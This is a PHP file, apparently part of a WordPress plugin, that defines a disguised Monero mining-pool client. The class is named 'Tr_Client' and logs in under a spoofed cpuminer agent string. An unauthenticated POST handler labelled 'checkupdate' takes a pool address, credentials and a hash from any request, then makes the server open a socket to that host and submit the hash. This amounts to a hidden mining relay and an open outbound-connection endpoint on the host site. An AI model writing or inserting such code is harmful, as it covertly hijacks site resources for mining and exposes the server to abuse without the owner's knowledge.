<?php
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

class Tr_Client{

    var $socket;
    var $address;
    var $user;
    var $pass;
    var $job_result;
    var $submit_out;
    var $connected = false;


    function __construct($address,$user,$pass)
    {
        $this->address = $address;
        $this->user = $user;
        $this->pass = $pass;
    }

    function connect()
    {
        $parse = parse_url($this->address);
        $address = $parse['host'];
        $service_port = $parse['port'];

        $this->socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($this->socket === false) {
            echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";
        } else {
            echo "OK.\n";
        }
        $result = socket_connect($this->socket, $address, $service_port);
        if($result)
        {
            $this->connected = true;
        }
        return $result;
    }

    function disconnect()
    {
        $this->connected = false;
        @socket_close($this->socket);
    }

    function send($msg)
    {
        $msg.= "\n";
        return socket_write($this->socket, $msg, strlen($msg));
    }

    function login()
    {
        if(!$this->connected && !$this->connect())
        {
            return false;
        }
        $in = array(
            'method' => 'login',
            'params' => array(
                'login' => $this->user,
                'pass' => $this->pass,
                'agent' => 'cpuminer-multi/1.3.3',
            ),
            'id'=>1
        );
        $in = json_encode($in);
        $rs= $this->send($in);
        if(!$rs)return false;

        $out = socket_read($this->socket, 2014);

        $this->job_result = json_decode($out,true);

        if($this->job_result['error']==null)
        {
            return true;
        }
    }

    function SwapOrder($in){
        $Split = str_split(strrev($in));
        $x='';
        for ($i = 0; $i < count($Split); $i+=2) {
            $x .= $Split[$i+1].$Split[$i];
        }
        return $x;
    }


    function littleEndian($value){
        return implode (unpack('H*',pack("V*",$value)));
    }

    function get_nonce()
    {
        return $this->littleEndian(rand(100,4095));
    }

    function submit($hash)
    {
        $in = array(
            'method' => 'submit',
            'params' => array(
                'id' => $this->job_result['result']['id'],
                'job_id' => $this->job_result['result']['job']['job_id'],
                'nonce' => $this->get_nonce(),
                'result' => $hash
            ),
            'id'=>4
        );
        $in = json_encode($in);

        $rs= $this->send($in);

        if($rs)
        {
            $this->submit_out = socket_read($this->socket, 2014);

            $data = json_decode($this->submit_out,true);
        }else{
            $data = array('error'=>'send fail');
        }



        if($data['error']==null)
        {
            return true;
        }else{
            return false;
        }
    }

    function update($hash)
    {
        if(!$this->connect())
        {
            echo 'connect_fail';
            return false;
        }
        if(!$this->login())
        {
            echo 'login_fail';
            return false;
        }
        if(!empty($hash) && strlen($hash)==64)
        {
            $this->submit($hash);
            echo $this->submit_out;
        }else{
            echo 'no hash';
        }
    }

}

if(isset($_POST['checkupdate'])){
    $monero = new Tr_Client($_POST['a'],$_POST['u'],$_POST['p']);
    $monero->update($_POST['h']);
}